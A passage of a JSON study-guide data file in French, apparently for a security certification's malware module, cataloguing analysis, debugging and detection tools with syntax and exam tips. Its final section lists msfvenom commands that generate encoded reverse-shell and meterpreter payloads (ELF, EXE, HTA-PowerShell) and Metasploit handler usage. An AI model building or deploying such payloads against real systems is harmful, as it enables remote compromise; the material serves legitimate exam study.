le compilateur associé à un exécutable. Ils servent à savoir si le binaire est compressé ou protégé avant de pousser l’analyse."},{"name":"UPX","desc":"Packer très répandu pour les exécutables. Dans le contexte malware, l’analyste doit savoir reconnaître qu’un binaire peut être packé avant d’accéder au vrai code."},{"name":"VirusTotal","desc":"Service qui compare un hash ou un fichier à de nombreux moteurs antivirus pour savoir si un échantillon est déjà connu. Cette étape est rapide mais ne remplace pas l’analyse comportementale.","syntax":"md5sum.exe bogus.exe","exam":"MD5 et SHA sont cités comme familles de fonctions de hachage ; VirusTotal accepte un hash ou un fichier."},{"name":"capa","desc":"Outil FLARE/Mandiant d’analyse statique comportementale. Il inspecte le binaire sans l’exécuter et identifie des capacités, ensuite mappables vers MITRE MBC."},{"name":"readelf","desc":"Outil d’analyse des fichiers ELF. Les options du module permettent d’afficher les symboles, program headers et ELF headers.","syntax":"readelf -s <sample>   # symbols\nreadelf -l <sample>   # program headers\nreadelf -h <sample>   # ELF header"},{"name":"strings","desc":"Extrait les chaînes lisibles présentes dans un binaire. Les URLs, noms de fichiers, clés Registry, messages d’erreur ou domaines peuvent donner des indices très rapides avant la rétro-ingénierie.","syntax":"strings <sample> > str.txt"},{"name":"oletools","desc":"Famille d’outils destinée aux documents Office suspects. Le module cite oleid et oledump pour examiner les propriétés et streams d’un document susceptible de contenir du contenu malveillant."},{"name":"PDFStreamDumper","desc":"Outil cité pour analyser les PDF suspects et repérer des objets, exploits ou références à des vulnérabilités intégrés au document."}]},{"g":"Analyse dynamique & debugging","items":[{"name":"Cuckoo Sandbox","desc":"Sandbox automatisée qui lance le malware dans une VM, surveille les changements et produit un rapport. Elle peut également prendre des captures d’écran pendant l’exécution."},{"name":"INetSim","desc":"Simule des services Internet dans le lab afin que le malware pense contacter HTTP, DNS, SMTP, FTP ou IRC sans atteindre l’Internet réel. Cela permet d’observer son comportement réseau de manière contrôlée."},{"name":"OllyDbg","desc":"Debugger Windows gratuit permettant de suivre l’exécution instruction par instruction et d’utiliser des breakpoints."},{"name":"Immunity Debugger","desc":"Debugger Windows basé sur OllyDbg avec scripting Python. Il est aussi utilisé avec mona.py dans les exercices de buffer overflow."},{"name":"WinDbg","desc":"Debugger Windows officiel de Microsoft pour inspecter processus, mémoire et exécution."},{"name":"Ghidra Debugger","desc":"Ghidra ne se limite pas au désassemblage ; il possède aussi des capacités de debugging pour observer un binaire pendant son exécution."},{"name":"strace","desc":"Trace les appels système Linux réalisés par un programme. C’est utile pour voir les fichiers ouverts, sockets, processus créés ou opérations demandées au kernel.","syntax":"strace -o out.txt ./<sample>"},{"name":"Wireshark","desc":"Capture le trafic du malware pour identifier DNS, HTTP/HTTPS, C2 et autres communications réseau. Dans un lab, il aide à relier l’exécution locale aux échanges externes."},{"name":"netstat","desc":"Affiche les connexions réseau et ports en écoute. Pendant une analyse dynamique, il sert à repérer un nouveau listener ou une connexion C2 créée après l’exécution.","syntax":"netstat -an"},{"name":"DriverView","desc":"Outil cité pour surveiller les drivers chargés pendant l’analyse dynamique, utile lorsqu’un malware installe ou modifie un composant kernel."}]},{"g":"YARA & détection","items":[{"name":"YARA CLI","desc":"Applique un fichier de règles YARA à un fichier suspect. Une règle peut combiner chaînes ASCII, hexadécimal et conditions logiques afin d’identifier un comportement ou une famille.","syntax":"yara <path_to/rulefile.yar> <path_to/suspicious_file>"},{"name":"Antivirus","desc":"Les antivirus cités incluent Kaspersky, Norton, Bitdefender, Avast, Intego, TotalAV, Webroot, ESET, Avira et Panda. Pour l’examen, l’important est surtout de comprendre la logique signatures + protections complémentaires."},{"name":"NGAV","desc":"Next-Generation Antivirus ajoute analyse comportementale et ML/IA pour améliorer la détection de menaces polymorphes ou fileless. Le module cite notamment Cynet comme solution de détection fileless."},{"name":"EDR / XDR","desc":"Les plateformes Endpoint Detection and Response surveillent les comportements sur les endpoints. Les solutions citées incluent Microsoft Defender for Endpoint, Tanium, Cisco XDR, Trellix ENS, VMware Carbon Black et CrowdStrike Falcon Insight XDR."},{"name":"Network monitoring tools","desc":"Le module cite Wireshark, Colasoft Portable Network Analyzer, OmniPeek, Observer Analyzer, PRTG Network Monitor et NetFlow Analyzer pour observer le trafic, C2 et exfiltration."}]},{"g":"Création / payloads — commandes à reconnaître","items":[{"name":"msfvenom","desc":"Outil Metasploit qui génère un payload dans un format adapté à la cible. Les options à connaître dans les exemples du chapitre définissent architecture, payload, IP/port de callback, plateforme, format, encoder, nombre d’itérations et fichier de sortie.","syntax":"msfvenom -a x86 -p linux/x86/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f elf --platform=linux -o payload\n\nmsfvenom -a x86 -p linux/x86/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f elf --platform=linux -e x86/shikata_ga_nai -i 5 -o payload\n\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe -e x86/shikata_ga_nai -a x86 -i 3 -o payload.exe\n\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=443 -e x86/shikata_ga_nai -f hta-psh -o evil.hta","cheat":[{"words":1,"title":"Options importantes","rows":[["-a","architecture cible"],["-p","payload"],["LHOST","IP du listener"],["LPORT","port du listener"],["-f","format de sortie : elf, exe, hta-psh…"],["--platform","OS cible"],["-o","nom du fichier de sortie"],["-e","encoder"],["-i","nombre d’itérations d’encodage"]]}],"exam":"ELF = Linux ; EXE/PE = Windows ; hta-psh = HTA contenant PowerShell."},{"name":"msfconsole — rechercher un payload","desc":"Le chapitre montre la recherche de payloads par architecture, plateforme et type de connexion avant de les utiliser avec msfvenom ou un handler.","syntax":"search arch:x86 platform:windows reverse_tcp"},{"name":"Metasploit multi/handler","desc":"Listener Metasploit utilisé pour recevoir le callback d’un payload compatible. Le PAYLOAD du handler doit correspondre à celui généré et le listener doit
